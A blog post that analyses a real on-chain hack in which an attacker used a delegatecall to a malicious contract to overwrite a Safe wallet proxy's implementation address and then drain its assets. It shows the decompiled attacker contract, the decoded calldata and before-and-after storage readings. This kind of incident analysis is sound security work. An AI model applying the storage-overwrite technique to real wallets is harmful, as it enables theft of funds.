---
layout: post
title: "DelegateCall"
date: 2025-2-22  17:19:58+08:00
categories: smart contract
---
# 1. Summary 

* [The basis](#the-basis)
* [Hack steps on chain](#hack-steps-on-chain)

# The basis

1. Proxy contracts use `delegatecall` to call the implementation contract

2. Storage is existed in the proxy contract

# Hack steps on chain

### 1. Deploy a contract in order to replace the proxy's implement contract.

contract [0x96221423681A6d52E184D440a8eFCEbB105C7242](https://etherscan.io/address/0x96221423681A6d52E184D440a8eFCEbB105C7242)

After [decompile](https://etherscan.io/bytecode-decompiler?a=0x96221423681A6d52E184D440a8eFCEbB105C7242) the contract, the code is like

```
# Palkeoramix decompiler.

def storage:
  stor0 is uint256 at storage 0

def _fallback() payable: # default function
  revert

def transfer(address _to, uint256 _value) payable:
  require calldata.size - 4 >=ΓÇ▓ 64
  require _to == _to
  stor0 = _to

```

When call the contract's `transfer` it will set the storage 0 (address) to the `address`

### 2. Target wallet contract

Addreess [0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4](https://etherscan.io/address/0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4)

Implement contranct address stored on the storage 0 `masterCopy`, which will be replaced by hacker.

Proxy code

```
/**
 *Submitted for verification at Etherscan.io on 2020-01-13
*/

pragma solidity ^0.5.3;

/// @title Proxy - Generic proxy contract allows to execute all transactions applying the code of a master contract.
/// @author Stefan George - <stefan@gnosis.io>
/// @author Richard Meissner - <richard@gnosis.io>
contract Proxy {

    // masterCopy always needs to be first declared variable, to ensure that it is at the same location in the contracts to which calls are delegated.
    // To reduce deployment costs this variable is internal and needs to be retrieved via `getStorageAt`
    address internal masterCopy;

    /// @dev Constructor function sets address of master copy contract.
    /// @param _masterCopy Master copy address.
    constructor(address _masterCopy)
        public
    {
        require(_masterCopy != address(0), "Invalid master copy address provided");
        masterCopy = _masterCopy;
    }

    /// @dev Fallback function forwards all transactions and returns all received return data.
    function ()
        external
        payable
    {
        // solium-disable-next-line security/no-inline-assembly
        assembly {
            let masterCopy := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff)
            // 0xa619486e == keccak("masterCopy()"). The value is right padded to 32-bytes with 0s
            if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) {
                mstore(0, masterCopy)
                return(0, 0x20)
            }
            calldatacopy(0, 0, calldatasize())
            let success := delegatecall(gas, masterCopy, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if eq(success, 0) { revert(0, returndatasize()) }
            return(0, returndatasize())
        }
    }
}
```

### 3. Replace the wallet's implement address 

We don't know how the hacker get the signature, but finally he got it.

Before the hack, the implement contract is [0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F](https://etherscan.io/address/0x34cfac646f301356faa8b21e94227e3583fe3f5f)

```
cast storage 0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4 0 -b 21895237
0x00000000000000000000000034cfac646f301356faa8b21e94227e3583fe3f5f
```

Transaction [0x46deef0f52e3a983b67abf4714448a41dd7ffd6d32d32da69d62081c68ad7882](https://etherscan.io/tx/0x46deef0f52e3a983b67abf4714448a41dd7ffd6d32d32da69d62081c68ad7882)

After the transaction the wallet's implement contracts  became [0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516](https://etherscan.io/address/0xbdd077f651ebe7f7b3ce16fe5f2b025be2969516)

```
cast storage 0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4 0 -b 21895238
0x000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be2969516
```

Decoded the transaction's call data, we got

```
cast 4d 0x6a76120200000000000000000000000096221423681a6d52e184d440a8efcebb105c7242000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000b2b2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001c00000000000000000000000000000000000000000000000000000000000000044a9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be296951600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c3d0afef78a52fd504479dc2af3dc401334762cbd05609c7ac18db9ec5abf4a07a5cc09fc86efd3489707b89b0c729faed616459189cb50084f208d03b201b001f1f0f62ad358d6b319d3c1221d44456080068fe02ae5b1a39b4afb1e6721ca7f9903ac523a801533f265231cd35fc2dfddc3bd9a9563b51315cf9d5ff23dc6d2c221fdf9e4b878877a8dbeee951a4a31ddbf1d3b71e127d5eda44b4730030114baba52e06dd23da37cd2a07a6e84f9950db867374a0f77558f42adf4409bfd569673c1f0000000000000000000000000000000000000000000000000000000000

Function: execTransaction(address to, uint256 value, bytes data, uint8 operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, bytes signatures)

"execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)"

0x96221423681A6d52E184D440a8eFCEbB105C7242
0
0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000
1
45746 [4.574e4]
0
0
0x0000000000000000000000000000000000000000
0x0000000000000000000000000000000000000000
0xd0afef78a52fd504479dc2af3dc401334762cbd05609c7ac18db9ec5abf4a07a5cc09fc86efd3489707b89b0c729faed616459189cb50084f208d03b201b001f1f0f62ad358d6b319d3c1221d44456080068fe02ae5b1a39b4afb1e6721ca7f9903ac523a801533f265231cd35fc2dfddc3bd9a9563b51315cf9d5ff23dc6d2c221fdf9e4b878877a8dbeee951a4a31ddbf1d3b71e127d5eda44b4730030114baba52e06dd23da37cd2a07a6e84f9950db867374a0f77558f42adf4409bfd569673c1f
```

The call stack looks like, refer to [here](https://dashboard.tenderly.co/tx/mainnet/0x46deef0f52e3a983b67abf4714448a41dd7ffd6d32d32da69d62081c68ad7882)

```
Sender->Proxy.fallback->Proxy.execTransaction->Implement constrcts execute
```

The original implement contract [0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F](https://etherscan.io/address/0x34cfac646f301356faa8b21e94227e3583fe3f5f)

```
/// @title Executor - A contract that can execute transactions
/// @author Richard Meissner - <richard@gnosis.pm>
contract Executor {

    function execute(address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 txGas)
        internal
        returns (bool success)
    {
        if (operation == Enum.Operation.Call)
            success = executeCall(to, value, data, txGas);
        else if (operation == Enum.Operation.DelegateCall)
            success = executeDelegateCall(to, data, txGas);
        else
            success = false;
    }

    function executeCall(address to, uint256 value, bytes memory data, uint256 txGas)
        internal
        returns (bool success)
    {
        // solium-disable-next-line security/no-inline-assembly
        assembly {
            success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0)
        }
    }

    function executeDelegateCall(address to, bytes memory data, uint256 txGas)
        internal
        returns (bool success)
    {
        // solium-disable-next-line security/no-inline-assembly
        assembly {
            success := delegatecall(txGas, to, add(data, 0x20), mload(data), 0, 0)
        }
    }
}
```

Based on the input data, we got another delegatecall from implement contract, the to address is the hacker deployed address [0x96221423681A6d52E184D440a8eFCEbB105C7242](https://etherscan.io/address/0x96221423681A6d52E184D440a8eFCEbB105C7242)

The decoded calldata is 

```
cast 4d 0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000
1) "transfer(address,uint256)"
0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516
0
```

Actually the `transfer` will replace the storage 0's address to [0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516](https://etherscan.io/address/0xbdd077f651ebe7f7b3ce16fe5f2b025be2969516)

### 4. Transfer asset

Here's the transactions

[0x25800d105db4f21908d646a7a3db849343737c5fba0bc5701f782bf0e75217c9](https://etherscan.io/tx/0x25800d105db4f21908d646a7a3db849343737c5fba0bc5701f782bf0e75217c9)
[0xb61413c495fdad6114a7aa863a00b2e3c28945979a10885b12b30316ea9f072c](https://etherscan.io/tx/0xb61413c495fdad6114a7aa863a00b2e3c28945979a10885b12b30316ea9f072c)
[0xbcf316f5835362b7f1586215173cc8b294f5499c60c029a3de6318bf25ca7b20](https://etherscan.io/tx/0xbcf316f5835362b7f1586215173cc8b294f5499c60c029a3de6318bf25ca7b20)
[0xa284a1bc4c7e0379c924c73fcea1067068635507254b03ebbbd3f4e222c1fae0](https://etherscan.io/tx/0xa284a1bc4c7e0379c924c73fcea1067068635507254b03ebbbd3f4e222c1fae0)
[0x847b8403e8a4816a4de1e63db321705cdb6f998fb01ab58f653b863fda988647](https://etherscan.io/tx/0x847b8403e8a4816a4de1e63db321705cdb6f998fb01ab58f653b863fda988647)
